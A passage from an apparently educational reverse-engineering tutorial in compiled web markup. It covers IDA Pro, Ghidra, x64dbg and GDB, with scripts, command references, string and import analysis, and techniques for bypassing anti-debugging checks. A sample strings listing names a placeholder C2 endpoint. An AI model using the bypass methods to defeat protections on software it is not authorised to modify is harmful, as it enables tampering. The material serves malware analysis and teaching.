(Shift+F12):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'Address   String\n00402000  "Password: "\n00402010  "Access granted!"\n00402020  "Access denied!"\n00402030  "https://malicious-c2.com/api"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Imports/Exports (View \u2192 Open subviews \u2192 Imports):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Address   Library      Function\n00401000  kernel32.dll CreateFileA\n00401008  kernel32.dll WriteFile\n00401010  ws2_32.dll   WSAStartup\n00401018  ws2_32.dll   connect\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"5. Cross-references (Xrefs):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'; Right-click on function/data \u2192 "Jump to xref to operand"\n; Shows all locations that call this function or reference this data\n\n.text:00401000 CreateFileA:\n    .text:00401050  call CreateFileA  ; First xref\n    .text:00401100  call CreateFileA  ; Second xref\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"IDA Pro shortcuts:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Key"}),(0,i.jsx)(n.th,{children:"Action"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Space"})}),(0,i.jsx)(n.td,{children:"Toggle graph view / text view"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"F5"})}),(0,i.jsx)(n.td,{children:"Decompile function (Hex-Rays)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"N"})}),(0,i.jsx)(n.td,{children:"Rename symbol"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"X"})}),(0,i.jsx)(n.td,{children:"Show cross-references (xrefs)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"G"})}),(0,i.jsx)(n.td,{children:"Jump to address"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Esc"})}),(0,i.jsx)(n.td,{children:"Go back"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:";"})}),(0,i.jsx)(n.td,{children:"Add comment"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:":"})}),(0,i.jsx)(n.td,{children:"Add repeatable comment"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Y"})}),(0,i.jsx)(n.td,{children:"Change function prototype"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"D"})}),(0,i.jsx)(n.td,{children:"Convert to data"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"C"})}),(0,i.jsx)(n.td,{children:"Convert to code"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"U"})}),(0,i.jsx)(n.td,{children:"Undefine"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"IDAPython scripting:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'# IDAPython: Rename all functions starting with "sub_"\nimport idc\nimport idaapi\n\nfor func_ea in Functions():\n    func_name = idc.get_func_name(func_ea)\n    if func_name.startswith("sub_"):\n        # Rename based on strings or behavior\n        new_name = "analyze_me_" + func_name\n        idc.set_name(func_ea, new_name, idc.SN_CHECK)\n        print(f"Renamed {func_name} to {new_name}")\n'})}),"\n",(0,i.jsx)(n.h3,{id:"ghidra-basics",children:"Ghidra Basics"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Launching Ghidra:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Linux/macOS:\n./ghidraRun\n\n# Windows:\nghidraRun.bat\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Creating a project and importing binary:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"File \u2192 New Project"})," \u2192 Non-Shared Project"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"File \u2192 Import File"})," \u2192 Select binary"]}),"\n",(0,i.jsx)(n.li,{children:'Analyze with default options (click "Yes" when prompted)'}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Ghidra interface:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. CodeBrowser (main window):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Listing:"})," Disassembly view (assembly code)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Decompiler:"})," Decompiled C-like code (click on function)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Function Graph:"})," Control flow graph"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Decompiler view:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'void main(void) {\n  int counter = 0;\n  while (counter < 10) {\n    printf("Counter: %d\\n", counter);\n    counter = counter + 1;\n  }\n  return;\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Symbol Tree:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Functions, imports, exports, strings"}),"\n",(0,i.jsx)(n.li,{children:'Right-click \u2192 "References to" (find xrefs)'}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Ghidra shortcuts:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Key"}),(0,i.jsx)(n.th,{children:"Action"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"L"})}),(0,i.jsx)(n.td,{children:"Rename variable/function"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:";"})}),(0,i.jsx)(n.td,{children:"Add comment (EOL comment)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ctrl+Shift+G"})}),(0,i.jsx)(n.td,{children:"Goto address"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ctrl+Shift+E"})}),(0,i.jsx)(n.td,{children:"Edit function signature"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"G"})}),(0,i.jsx)(n.td,{children:"Goto (jump to reference)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ctrl+/"})}),(0,i.jsx)(n.td,{children:"Add/remove bookmark"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Ghidra scripting (Python):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'# Ghidra Python: Find all calls to "strcpy" (dangerous function)\nfrom ghidra.program.model.symbol import RefType\n\nstrcpy_func = getFunction("strcpy")\nif strcpy_func:\n    refs = getReferencesTo(strcpy_func.getEntryPoint())\n    for ref in refs:\n        if ref.getReferenceType() == RefType.UNCONDITIONAL_CALL:\n            caller = getFunctionContaining(ref.getFromAddress())\n            print(f"strcpy called from: {caller.getName()} at {ref.getFromAddress()}")\n'})}),"\n",(0,i.jsx)(n.h3,{id:"string-analysis",children:"String Analysis"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Why strings matter:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Reveal functionality (API endpoints, file paths, error messages)"}),"\n",(0,i.jsx)(n.li,{children:"Provide clues for password/license checks"}),"\n",(0,i.jsx)(n.li,{children:"Indicate malware C2 servers or exfiltration targets"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Extracting strings:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Linux: strings command\nstrings malware.bin | grep -i "password"\nstrings -e l malware.bin  # Unicode (little-endian) strings\n\n# Windows: Sysinternals strings.exe\nstrings64.exe malware.exe | findstr /i "http"\n\n# IDA Pro: Shift+F12 (Strings window)\n# Ghidra: Window \u2192 Defined Strings\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Obfuscated strings:"})}),"\n",(0,i.jsx)(n.p,{children:"Malware often hides strings via encoding/encryption:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"// Example: XOR-encoded string\nchar encoded[] = {0x1F, 0x0E, 0x0C, 0x0C, 0x18, 0x05, 0x3B, 0x00};\nchar decoded[9];\n\nfor (int i = 0; i < 8; i++) {\n    decoded[i] = encoded[i] ^ 0x42;  // XOR with key 0x42\n}\ndecoded[8] = '\\0';\n// Result: \"MALWARE\"\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Decoding in IDA/Ghidra:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Identify decoding loop in disassembly"}),"\n",(0,i.jsx)(n.li,{children:"Extract encoded data and XOR key"}),"\n",(0,i.jsx)(n.li,{children:"Write script to decode:"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"# IDAPython: Decode XOR-encoded string\nencoded = [0x1F, 0x0E, 0x0C, 0x0C, 0x18, 0x05, 0x3B]\nkey = 0x42\ndecoded = ''.join(chr(b ^ key) for b in encoded)\nprint(f\"Decoded: {decoded}\")\n"})}),"\n",(0,i.jsx)(n.h3,{id:"importexport-analysis",children:"Import/Export Analysis"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Imports"})," reveal which external functions the binary uses (Windows API, libc, etc.)."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Windows PE imports:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"kernel32.dll:\n  - CreateFileA       (file operations)\n  - WriteFile         (write to file)\n  - CreateProcessA    (spawn process)\n\nws2_32.dll:\n  - WSAStartup        (network initialization)\n  - socket            (create socket)\n  - connect           (connect to remote host)\n\nuser32.dll:\n  - MessageBoxA       (display message)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Suspicious import patterns:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Imports"}),(0,i.jsx)(n.th,{children:"Likely Functionality"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"CreateFileA"}),", ",(0,i.jsx)(n.code,{children:"WriteFile"}),", ",(0,i.jsx)(n.code,{children:"ReadFile"})]}),(0,i.jsx)(n.td,{children:"File operations (ransomware, data theft)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"WSAStartup"}),", ",(0,i.jsx)(n.code,{children:"socket"}),", ",(0,i.jsx)(n.code,{children:"connect"})]}),(0,i.jsx)(n.td,{children:"Network communication (C2, data exfiltration)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"CreateProcessA"}),", ",(0,i.jsx)(n.code,{children:"ShellExecuteA"})]}),(0,i.jsx)(n.td,{children:"Process execution (dropper, backdoor)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"VirtualAlloc"}),", ",(0,i.jsx)(n.code,{children:"WriteProcessMemory"})]}),(0,i.jsx)(n.td,{children:"Code injection (process hollowing)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"RegOpenKeyExA"}),", ",(0,i.jsx)(n.code,{children:"RegSetValueExA"})]}),(0,i.jsx)(n.td,{children:"Registry modification (persistence)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsxs)(n.td,{children:[(0,i.jsx)(n.code,{children:"CryptEncrypt"}),", ",(0,i.jsx)(n.code,{children:"CryptDecrypt"})]}),(0,i.jsx)(n.td,{children:"Encryption (ransomware, data protection)"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analyzing imports in IDA:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"View \u2192 Open subviews \u2192 Imports"})}),"\n",(0,i.jsx)(n.li,{children:"Double-click on import to see where it's called (xrefs)"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analyzing imports in Ghidra:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Symbol Tree \u2192 Imports"})}),"\n",(0,i.jsxs)(n.li,{children:["Right-click \u2192 ",(0,i.jsx)(n.strong,{children:"References to"})," (show xrefs)"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"dynamic-analysis",children:"Dynamic Analysis"}),"\n",(0,i.jsx)(n.h3,{id:"debuggers",children:"Debuggers"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Dynamic analysis"})," examines the binary during execution."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Popular debuggers:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Debugger"}),(0,i.jsx)(n.th,{children:"Platform"}),(0,i.jsx)(n.th,{children:"Best For"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"x64dbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"User-mode debugging, malware analysis, CTF"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"WinDbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"Kernel debugging, crash dumps, advanced Windows internals"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"GDB"})}),(0,i.jsx)(n.td,{children:"Linux, macOS"}),(0,i.jsx)(n.td,{children:"Linux/macOS binaries, exploit development, scriptable with Python"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"LLDB"})}),(0,i.jsx)(n.td,{children:"macOS, Linux"}),(0,i.jsx)(n.td,{children:"macOS/iOS debugging, modern alternative to GDB"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"OllyDbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"Legacy 32-bit Windows debugging (x64dbg is successor)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"IDA Pro Debugger"})}),(0,i.jsx)(n.td,{children:"Windows, Linux, macOS"}),(0,i.jsx)(n.td,{children:"Integrated with IDA disassembly"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"x64dbg-basics",children:"x64dbg Basics"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Launching x64dbg:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Windows: Launch x32dbg.exe (32-bit) or x64dbg.exe (64-bit)\nx64dbg.exe malware.exe\n\n# Or: File \u2192 Open \u2192 Select binary\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"x64dbg interface:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. CPU view (disassembly):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"00401000 | 55                 | push ebp\n00401001 | 8B EC              | mov ebp, esp\n00401003 | 83 EC 20           | sub esp, 0x20\n00401006 | C7 45 FC 00 00 00 00 | mov dword ptr [ebp-4], 0\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Registers:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"RAX = 0000000000000000\nRBX = 0000000000000000\nRCX = 0000000000401000\nRDX = 0000000000000000\nRSP = 000000000012FF00\nRBP = 000000000012FF20\nRIP = 0000000000401000  <-- Current instruction\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Stack:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Address       Value             Comment\n0012FF00      00000000\n0012FF04      00401050          Return address\n0012FF08      00000001          Argument 1\n0012FF0C      00402000          Argument 2\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Memory dump:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"Address   Hex                               ASCII\n00402000  48 65 6C 6C 6F 20 57 6F 72 6C 64  Hello World\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Setting breakpoints:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Software breakpoint (F2):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Click on instruction \u2192 Press ",(0,i.jsx)(n.strong,{children:"F2"})," (or right-click \u2192 Breakpoint \u2192 Toggle)"]}),"\n",(0,i.jsx)(n.li,{children:"Breaks when instruction is executed"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Use case:"})," Break on function entry, suspicious API calls"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Hardware breakpoint:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Debug \u2192 Hardware breakpoints"})}),"\n",(0,i.jsx)(n.li,{children:"Up to 4 hardware breakpoints (CPU limitation)"}),"\n",(0,i.jsxs)(n.li,{children:["Can break on ",(0,i.jsx)(n.strong,{children:"execution"}),", ",(0,i.jsx)(n.strong,{children:"read"}),", or ",(0,i.jsx)(n.strong,{children:"write"})," of memory address"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Use case:"})," Break when memory is modified (anti-debugging detection)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Memory breakpoint:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Right-click in memory dump \u2192 ",(0,i.jsx)(n.strong,{children:"Breakpoint \u2192 Memory Access"})," (read/write/execute)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Use case:"})," Track when buffer is written, monitor heap allocations"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Conditional breakpoint:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Right-click on breakpoint \u2192 ",(0,i.jsx)(n.strong,{children:"Edit"})]}),"\n",(0,i.jsxs)(n.li,{children:["Set condition (e.g., ",(0,i.jsx)(n.code,{children:"RAX == 0x42"}),")"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Use case:"})," Break only when specific value is encountered"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"x64dbg commands (command line at bottom):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Execution control:\nrun                    # Start execution\nStepInto               # F7 - Step into function call\nStepOver               # F8 - Step over function call\nStepOut                # Ctrl+F9 - Run until return\nRunToUser              # Alt+F9 - Run until user code (skip system DLLs)\n\n# Breakpoints:\nbp 401000              # Set breakpoint at address 0x401000\nbp CreateFileA         # Set breakpoint on function\nbc 401000              # Clear breakpoint\nbl                     # List breakpoints\n\n# Memory:\ndump 402000            # Show memory dump at address\nd eax                  # Dump memory at address in EAX\ndb 402000              # Dump bytes\ndd 402000              # Dump dwords\nda 402000              # Dump ASCII string\n\n# Registers:\nr eax = 42             # Set EAX to 0x42\nr rip = 401000         # Set instruction pointer (change execution flow)\n\n# Search:\nfind 402000, "password"   # Search for string in memory\nfindall "http://"         # Find all occurrences\n\n# Comments:\ncmt 401000, "Main function starts here"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Tracing execution:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Trace into (log every instruction):\nTraceIntoConditional rax == 0\n\n# Trace over (log every function call):\nTraceOverConditional\n\n# Run trace (high-speed logging):\n# Debug \u2192 Run Trace \u2192 Start\n# Generates trace log for later analysis\n"})}),"\n",(0,i.jsx)(n.h3,{id:"gdb-basics",children:"GDB Basics"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Launching GDB:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Linux: Debug ELF binary\ngdb ./program\n\n# Attach to running process:\ngdb -p &lt;PID&gt;\n\n# With arguments:\ngdb --args ./program arg1 arg2\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"GDB commands:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Execution control:\nrun                    # Start execution (or "r")\ncontinue               # Continue execution (or "c")\nstep                   # Step into (single instruction, or "s")\nnext                   # Step over (or "n")\nstepi                  # Step single assembly instruction (or "si")\nnexti                  # Step over single assembly instruction (or "ni")\nfinish                 # Run until function returns\n\n# Breakpoints:\nbreak main             # Break at function "main" (or "b main")\nbreak *0x401000        # Break at address 0x401000\nbreak file.c:42        # Break at source line (if symbols available)\ninfo breakpoints       # List breakpoints (or "info b")\ndelete 1               # Delete breakpoint 1\ndisable 1              # Disable breakpoint 1\nenable 1               # Enable breakpoint 1\n\n# Watchpoints (break on memory access):\nwatch *0x601000        # Break when memory at 0x601000 is written\nrwatch *0x601000       # Break when memory is read\nawatch *0x601000       # Break when memory is read or written\n\n# Examining memory:\nx/10i $rip             # Examine 10 instructions at RIP (disassembly)\nx/10x $rsp             # Examine 10 hex values at RSP (stack)\nx/s 0x401000           # Examine string at address\nx/10gx $rsp            # Examine 10 giant (8-byte) hex values\n\n# Registers:\ninfo registers         # Show all registers (or "info r")\nprint $rax             # Print RAX value (or "p $rax")\nset $rax = 0x42        # Set RAX to 0x42\n\n# Disassembly:\ndisassemble main       # Disassemble function "main" (or "disas main")\ndisassemble 0x401000   # Disassemble at address\n\n# Backtrace (call stack):\nbacktrace              # Show call stack (or "bt")\nframe 2                # Switch to frame 2 in call stack\ninfo frame             # Show current frame info\n\n# Search memory:\nfind 0x400000, +0x10000, "password"  # Search for string\n\n# GDB-specific:\nset disassembly-flavor intel  # Use Intel syntax (default is AT&T)\nlayout asm             # Show TUI (Text UI) with disassembly\nlayout regs            # Show TUI with registers\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"GDB with PEDA/GEF/pwndbg (enhanced plugins):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Install PEDA (Python Exploit Development Assistance):\ngit clone https://github.com/longld/peda.git ~/peda\necho "source ~/peda/peda.py" >> ~/.gdbinit\n\n# Install GEF (GDB Enhanced Features):\nwget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py\necho "source ~/.gdbinit-gef.py" >> ~/.gdbinit\n\n# Install pwndbg:\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n\n# PEDA/GEF/pwndbg add commands:\nchecksec               # Check binary protections (NX, PIE, RELRO, Canary)\nvmmap                  # Show memory mappings\ntelescope $rsp 20      # Show stack with dereferenced pointers\npattern create 200     # Create cyclic pattern for finding offsets\npattern offset 0x41614141  # Find offset of pattern in EIP/RIP\nrop                    # Search for ROP gadgets\n'})}),"\n",(0,i.jsx)(n.h3,{id:"bypassing-anti-debugging",children:"Bypassing Anti-Debugging"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Anti-debugging techniques:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. IsDebuggerPresent (Windows):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Check if debugger is attached\ncall IsDebuggerPresent\ntest eax, eax\njnz debugger_detected   ; Jump if EAX != 0 (debugger present)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# x64dbg: Set breakpoint on IsDebuggerPresent, modify return value\nbp IsDebuggerPresent\n# When hit: Set RAX = 0 (no debugger)\nr rax = 0\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. PEB BeingDebugged flag:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Check PEB->BeingDebugged (offset 0x2 in PEB)\nmov eax, fs:[0x30]      ; PEB address (x86)\nmovzx eax, byte ptr [eax+0x2]  ; BeingDebugged flag\ntest eax, eax\njnz debugger_detected\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# x64dbg: Find PEB address, set BeingDebugged to 0\n# View \u2192 Memory Map \u2192 Find PEB\n# Set byte at PEB+0x2 to 0x00\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Timing checks:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"// Measure time between two points (debugger slows execution)\nDWORD start = GetTickCount();\n// ... some code ...\nDWORD end = GetTickCount();\nif (end - start > 1000) {\n    // Debugger detected (took too long)\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# x64dbg: Modify timing values or patch comparison\n# Set breakpoint before comparison, modify end value:\nr eax = &lt;start_value&gt;  # Make time difference = 0\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. RDTSC (Read Time-Stamp Counter):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"rdtsc                   ; Read CPU timestamp into EDX:EAX\nmov ebx, eax            ; Save timestamp\n; ... some code ...\nrdtsc                   ; Read timestamp again\nsub eax, ebx            ; Calculate difference\ncmp eax, 0x1000         ; Check if too slow\nja debugger_detected\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Patch RDTSC or comparison\n# x64dbg: Assemble \u2192 Replace "cmp eax, 0x1000" with "cmp eax, 0xFFFFFFFF"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"5. Exception-based anti-debugging:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"// Debugger handles exceptions differently\n__try {\n    int x = *(int*)0x00000000;  // Trigger exception\n} __except(EXCEPTION_EXECUTE_HANDLER) {\n    // No debugger (exception handled 